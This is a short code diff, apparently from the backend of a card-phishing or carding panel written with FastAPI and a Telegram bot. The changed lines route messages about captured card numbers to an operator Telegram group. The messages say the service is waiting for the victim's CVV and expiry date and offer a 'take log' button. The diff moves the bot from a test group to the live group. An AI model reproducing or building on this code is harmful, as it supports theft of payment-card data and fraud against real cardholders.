@@ -46,7 +46,7 @@ def register_endpoints(app: FastAPI, bot: Bot):
                     f"⏳ Ожидаем CVV и expiry date..."
                 )
                 
-                await bot.send_message(config.GROUP_ID_TEST, message_text, parse_mode="HTML")
+                await bot.send_message(config.GROUP_ID, message_text, parse_mode="HTML")
                 
             else:
                 card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
@@ -60,7 +60,7 @@ def register_endpoints(app: FastAPI, bot: Bot):
                 )
                 
                 await bot.send_message(
-                    config.GROUP_ID_TEST, 
+                    config.GROUP_ID, 
                     message_text, 
                     parse_mode="HTML", 
                     reply_markup=get_take_log_keyboard(session_id)
